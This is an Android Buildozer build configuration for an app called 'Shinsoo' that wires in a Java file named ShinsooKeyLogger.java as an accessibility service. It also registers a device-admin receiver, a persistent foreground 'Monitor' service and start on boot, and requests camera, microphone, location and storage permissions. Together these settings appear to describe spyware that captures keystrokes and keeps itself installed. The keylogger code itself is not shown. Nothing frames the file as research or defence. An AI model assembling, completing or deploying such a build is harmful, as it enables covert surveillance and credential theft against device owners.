[app]
title = Shinsoo
package.name = shinsoo
package.domain = com.shinsoo
version = 1.0.0
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,xml
entrypoint = main.py

requirements = python3,kivy==2.3.0,pyjnius,pillow,requests,certifi,plyer,urllib3,charset-normalizer,idna

orientation = portrait

services = Monitor:service/monitor.py:foreground

android.permissions = CAMERA,RECORD_AUDIO,WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE,INTERNET,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,ACCESS_NETWORK_STATE,WAKE_LOCK,FOREGROUND_SERVICE,RECEIVE_BOOT_COMPLETED,BIND_DEVICE_ADMIN,BIND_ACCESSIBILITY_SERVICE

android.minapi = 26
android.api = 33
android.ndk = 25b
android.sdk = 33
android.ndk_api = 26
android.archs = arm64-v8a,armeabi-v7a

android.add_src = src/ShinsooKeyLogger.java

android.add_resources = res/xml/device_admin_rules.xml,res/xml/accessibility_service.xml

android.manifest.additions = """
    <receiver android:name=".DeviceAdminReceiver" android:exported="true" android:permission="android.permission.BIND_DEVICE_ADMIN"><meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin_rules" /><intent-filter><action android:name="android.app.action.DEVICE_ADMIN_ENABLED" /></intent-filter></receiver>
    <service android:name=".ShinsooKeyLogger" android:exported="true" android:label="Shinsoo" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"><intent-filter><action android:name="android.accessibilityservice.AccessibilityService" /></intent-filter><meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service" /></service>
"""

p4a.bootstrap = sdl2

android.gradle_dependencies = androidx.core:core:1.10.1

[buildozer]
log_level = 2
warn_on_root = 1
